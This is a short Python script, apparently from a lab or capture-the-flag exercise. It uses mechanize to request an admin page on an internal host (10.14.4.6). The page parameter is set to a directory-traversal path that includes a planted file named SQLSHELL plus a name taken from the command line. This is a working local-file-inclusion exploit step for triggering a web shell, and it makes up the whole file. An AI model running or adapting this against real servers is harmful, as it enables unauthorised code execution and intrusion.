import webbrowser
import sys
import time
import requests as req
import mechanize

# wait a few seconds first
time.sleep(2)
name = sys.argv[1]

#use mechanize to connect
url = 'http://10.14.4.6/admin/index.php?page=../../../../tmp/SQLSHELL'+name
op = mechanize.Browser()
op.set_handle_robots(False)
op.open(url)

